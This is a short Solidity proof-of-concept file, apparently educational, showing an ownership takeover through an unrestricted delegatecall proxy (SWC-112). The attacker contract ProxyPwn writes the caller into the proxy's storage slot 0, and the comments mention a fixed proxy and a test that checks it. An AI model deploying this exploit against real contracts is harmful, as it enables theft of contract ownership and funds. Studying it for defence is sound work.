/*
 * Educational proof-of-concept for the delegatecall flaw (SWC-112).
 *
 * The vulnerable Proxy.forward() runs delegatecall against any address the
 * caller supplies. Under delegatecall the target's code executes in the
 * Proxy's storage context, so writing "owner" here (storage slot 0) actually
 * overwrites slot 0 of the Proxy. Because msg.sender is preserved through a
 * delegatecall, it becomes whoever called forward() — the attacker.
 *
 * This demonstrates the takeover; the fixed Proxy blocks it with onlyOwner
 * plus an allowlist, which the test asserts.
 */
pragma solidity ^0.4.24;

contract ProxyPwn {
    address public owner; // aligns with Proxy's slot 0

    function pwn() public {
        owner = msg.sender;
    }
}
